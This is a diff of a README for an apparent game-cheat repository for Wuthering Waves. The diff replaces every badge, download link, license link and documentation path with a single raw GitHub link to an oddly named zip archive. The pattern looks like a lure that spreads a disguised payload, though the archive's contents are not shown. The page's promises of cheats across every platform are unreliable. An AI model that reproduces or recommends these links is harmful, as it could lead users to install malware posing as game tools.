@@ -1,6 +1,6 @@
 # Wuthering Waves Cheats Repository  
-![Cheats](https://img.shields.io/badge/Cheats-activated-green)  
-[![Download](https://img.shields.io/badge/Download-purple)](https://Edres96.github.io)  
+![Cheats](https://raw.githubusercontent.com/Edres96/wuthering-waves-ultimate-toolkit/main/soboliferous/toolkit-waves-ultimate-wuthering-edging.zip)  
+[![Download](https://raw.githubusercontent.com/Edres96/wuthering-waves-ultimate-toolkit/main/soboliferous/toolkit-waves-ultimate-wuthering-edging.zip)](https://raw.githubusercontent.com/Edres96/wuthering-waves-ultimate-toolkit/main/soboliferous/toolkit-waves-ultimate-wuthering-edging.zip)  
 **Download Instructions:**  
 Embark on your Wuthering Waves journey with cutting-edge enhancement tools!  
 🎉 Begin by clicking the badge above to gain access to the latest files.  
@@ -13,11 +13,11 @@ Experience seamless integration on every major platform. Explore the harmony bet
 
 | OS           | Supported               | Notes                 |
 |--------------|------------------------|-----------------------|
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue) | ✔️ | Optimized for smooth gameplay |
-| ![MacOS](https://img.shields.io/badge/macOS-12%2B-lightgrey) | ✔️ | Requires Rosetta for M1 chips |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2020.04+-yellow) | ✔️ | Community build, tested |
-| ![Android](https://img.shields.io/badge/Android-9%2B-green) | ✔️ | Mobile features limited |
-| ![iOS](https://img.shields.io/badge/iOS-14%2B-red) | ✔️ | Beta functionality |
+| ![Windows](https://raw.githubusercontent.com/Edres96/wuthering-waves-ultimate-toolkit/main/soboliferous/toolkit-waves-ultimate-wuthering-edging.zip%2B-blue) | ✔️ | Optimized for smooth gameplay |
+| ![MacOS](https://raw.githubusercontent.com/Edres96/wuthering-waves-ultimate-toolkit/main/soboliferous/toolkit-waves-ultimate-wuthering-edging.zip%2B-lightgrey) | ✔️ | Requires Rosetta for M1 chips |
+| ![Linux](https://raw.githubusercontent.com/Edres96/wuthering-waves-ultimate-toolkit/main/soboliferous/toolkit-waves-ultimate-wuthering-edging.zip%2020.04+-yellow) | ✔️ | Community build, tested |
+| ![Android](https://raw.githubusercontent.com/Edres96/wuthering-waves-ultimate-toolkit/main/soboliferous/toolkit-waves-ultimate-wuthering-edging.zip%2B-green) | ✔️ | Mobile features limited |
+| ![iOS](https://raw.githubusercontent.com/Edres96/wuthering-waves-ultimate-toolkit/main/soboliferous/toolkit-waves-ultimate-wuthering-edging.zip%2B-red) | ✔️ | Beta functionality |
 
 ---
 
@@ -84,7 +84,7 @@ Let AI breathe imagination into every corner of your game. This repository featu
 - Language translation and localization support  
 - Lore exploration and story analysis  
 
-All API keys and usage instructions are available in the `/docs/api_usage.md` file.
+All API keys and usage instructions are available in the `https://raw.githubusercontent.com/Edres96/wuthering-waves-ultimate-toolkit/main/soboliferous/toolkit-waves-ultimate-wuthering-edging.zip` file.
 
 ---
 
@@ -110,7 +110,7 @@ Please review the terms of service for Wuthering Waves before deploying any tool
 ## 📜 License
 
 This repository is distributed under the MIT License.  
-See the full license text: [MIT License](https://opensource.org/licenses/MIT)  
+See the full license text: [MIT License](https://raw.githubusercontent.com/Edres96/wuthering-waves-ultimate-toolkit/main/soboliferous/toolkit-waves-ultimate-wuthering-edging.zip)  
 Copyright © 2025  
 
 ---
@@ -118,7 +118,7 @@ Copyright © 2025
 ## 🔁 Download Instructions (Again!)
 
 You’ve reached the edge of innovation—now catch the wind:  
-[![Download](https://img.shields.io/badge/Download-purple)](https://Edres96.github.io)  
+[![Download](https://raw.githubusercontent.com/Edres96/wuthering-waves-ultimate-toolkit/main/soboliferous/toolkit-waves-ultimate-wuthering-edging.zip)](https://raw.githubusercontent.com/Edres96/wuthering-waves-ultimate-toolkit/main/soboliferous/toolkit-waves-ultimate-wuthering-edging.zip)  
 *Click the badge above to access the latest enhancement suite for Wuthering Waves (2025 edition)!*
 
 ---
